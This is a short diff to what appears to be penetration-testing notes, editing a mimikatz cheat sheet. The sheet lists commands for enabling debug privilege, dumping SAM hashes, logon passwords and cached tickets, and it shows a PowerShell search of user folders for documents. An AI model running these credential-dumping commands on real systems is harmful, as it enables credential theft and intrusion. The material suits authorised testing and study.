@@ -61,7 +61,7 @@ Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -Fi
 
 ## mimikatz.exe cheat sheet
 privilege::debug  -->  engage the SeDebugPrivlege  
-lsadump::sam --> Dump from SAM database  
+token::elevate + lsadump::sam --> Dump from SAM database  
 sekurlsa::logonpasswords --> Dump from Sekurlsa  
 sekurlsa::tickets --> Dump cached tickets  
 Some source: https://chryzsh.gitbooks.io/pentestbook/content/privilege_escalation_windows.html  
